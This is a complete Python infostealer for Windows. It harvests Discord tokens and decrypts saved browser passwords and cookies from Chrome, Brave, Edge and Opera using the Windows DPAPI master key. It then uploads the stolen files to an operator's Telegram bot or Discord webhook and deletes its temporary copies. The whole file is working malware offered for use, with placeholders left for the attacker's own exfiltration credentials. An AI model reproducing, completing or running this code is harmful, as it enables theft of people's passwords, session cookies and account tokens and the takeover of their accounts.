import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect

import win32crypt
from Cryptodome.Cipher import AES
from requests import post

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'OperaGX': roaming + '\\Opera Software\\Opera GX Stable'
}

browser_loc = {
    "Chrome": local + "\\Google\\Chrome",
    "Brave": local + "\\BraveSoftware\\Brave-Browser",
    "Edge": local + "\\Microsoft\\Edge",
    "Opera": roaming + "\\Opera Software\\Opera Stable",
    "OperaGX": roaming + "\\Opera Software\\Opera GX Stable",
}

fileCookies = "cooks_" + os.getlogin() + ".txt"
filePass = "passes_" + os.getlogin() + ".txt"
fileInfo = "info_" + os.getlogin() + ".txt"

# CHROME PROFILES
for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
    if i.startswith("Profile "):
        browser_loc["ChromeP"] = local + "\\Google\\Chrome\\User Data\\" + i
        
        
# DISCORD TOKENS
def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass


def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = path + "\\Local Storage\\leveldb\\"
    loc_state = path + "\\Local State"
    # new method with encryption
    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
            file.close()
        for file in os.listdir(lev_db):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(lev_db + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]

    else:  # old method without encryption
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            done.append(token)
            except:
                continue

    return done


# DECRYPT CIPHERS
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


# DECRYPT BROWSER
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            con = connect("TempMan.db")
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(filePass, "a") as f:
                f.write("***" + name + "***\n")
                f.close()
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                    with open(filePass, "a") as f:
                        f.write(to_print)
                        f.close()
                except (Exception, FileNotFoundError):
                    pass
        else:
            f = open(fileInfo, "a")
            f.write(name + " Login Data file missing\n")
            f.close()
        ######################################################################
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            with connect("CookMe.db") as conn:
                curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            with open(fileCookies, "a") as f:
                f.write("***" + name + "***\n")
                f.close()
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = 'URL : {}\nName: {}\nCook: {}\n\n'.format(cookies[0], cookies[1], dec_pass)
                    with open(fileCookies, "a") as f:
                        f.write(to_print)
                        f.close()
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write("no " + name + " Cookie file\n")
                f.close()
    else:
        with open(fileInfo, "a") as f:
            f.write(name + " Local State file missing\n")
            f.close()



# PATH SHIT
def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    if "Profile" in path:
        return path + "\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"


def Cookies(path):
    if "Profile" in path:
        return path + "\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"


def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue
        with open(fileInfo, "a") as f:
            for i in tokens:
                f.write(str(i) + "\n")
            f.close()


def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
    else:
        with open(fileInfo, "a") as f:
            f.write(browser + " not installed\n")
            f.close()


# WEBHOOK
def post_to(file):
    token = "TELEGRAM TOKEN"     # put your token in here, if you don't wanna use telegram leave it like it is
    chat_id = "TELEGRAM CHATID"  # "    chatid          "                     telegram      "
    webhook_url = "WEBHOOK URL"  # "    webhook         "                     discord       "
    # if you don't understand it you shouldn't use it

    if token == "TELEGRAM TOKEN":  # don't change
        pass
    else:
        if chat_id == "TELEGRAM CHATID":  # don't change
            pass
        else:
            post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chat_id},
                 files={'document': open(file, 'rb')})

    if webhook_url == "WEBHOOK URL":  # don't change
        pass
    else:
        post(webhook_url, files={'files': open(file, 'rb')})


forHandler = (
    fileInfo,
    filePass,
    fileCookies,
    "TempMan.db",
    "CookMe.db"
)


def fileHandler(file):
    if os.path.exists(file):
        if ".txt" in file:
            post_to(file)
        os.remove(file)


def main():
    for name, path in browser_loc.items():
        decrypt_files(path, name)
    main_tokens()
    for i in forHandler:
        fileHandler(i)


main()
